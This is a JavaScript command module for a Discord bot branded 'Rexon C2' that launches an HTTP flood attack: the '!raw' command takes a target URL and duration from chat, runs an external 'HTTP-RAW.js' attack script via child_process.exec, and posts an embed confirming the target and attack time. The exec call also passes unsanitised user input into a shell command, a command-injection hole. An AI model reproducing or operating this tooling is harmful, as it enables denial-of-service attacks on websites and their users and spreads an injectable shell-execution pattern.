const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('WHITE')
	.setTitle('WARRING')
	.setDescription("`Example : !raw https://example.com/ 60`")
	.setFooter("Please do not attack government website")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`node HTTP-RAW.js ${host} ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord :' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('WHITE')
	.setTitle('🚀 **Rexon C2** 🚀')
	.setTimestamp()
  .setDescription("**Plan**: `Gold` \n**Target** : `" + host + "` \n**Method** : `HTTP-RAW` \n**Time** : `" + duration + "`")
	.setFooter('© Developer: Senz', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media.giphy.com/media/l4KhQo2MESJkc6QbS/giphy.gif", "https://media.giphy.com/media/jzHFPlw89eTqU/giphy.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('WHITE')
	.setTitle('🚀 **Rexon C2** 🚀')
	.setTimestamp()
	.setDescription("**► Please wait for verification **")
	.setFooter('© Developer: Senz', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['raw'],
  permLevel: 0
}

exports.help = {
  name: 'raw',
  description: 'Senz',
  usage: 'raw'
}
